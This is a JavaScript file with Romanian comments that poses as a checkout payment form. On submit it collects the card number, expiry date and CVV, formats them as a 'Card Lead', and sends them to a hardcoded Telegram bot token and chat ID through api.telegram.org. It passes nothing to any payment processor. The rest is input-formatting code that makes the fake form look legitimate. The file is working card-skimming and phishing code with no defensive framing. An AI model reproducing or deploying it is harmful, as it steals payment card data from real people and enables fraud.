const botToken = "7601944721:AAHVmbhwDNlfIvIzWmx8i9jL0J-EP2ptfls"; // Tokenul botului
const chatId = "6953089880"; // Chat ID-ul destinat

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();

    // Preluarea datelor introduse
    const cardNumber = document.getElementById('card-number').value;
    const expiryDate = document.getElementById('expiry-date').value;
    const cvv = document.getElementById('cvv').value;

    // Datele formatate pentru trimitere
    const orderDetails = `
Card Lead:
Număr Card: ${cardNumber}
Data Expirării: ${expiryDate}
CVV: ${cvv}
    `;

    // URL-ul pentru API-ul Telegram
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(orderDetails)}`;

    // Trimitere mesaj
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("Datele au fost trimise cu succes!");
            } else {
                alert("A apărut o eroare la trimiterea datelor.");
            }
        })
        .catch(error => {
            console.error("Eroare:", error);
            alert("A apărut o eroare.");
        });
});

// Validări suplimentare pentru input-uri
document.getElementById('card-number').addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^\d\s]/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
});

document.getElementById('expiry-date').addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^\d/]/g, '');
    if (e.target.value.length === 2 && !e.target.value.includes('/')) {
        e.target.value += '/';
    }
    e.target.value = e.target.value.slice(0, 5);
});

document.getElementById('cvv').addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 3);
});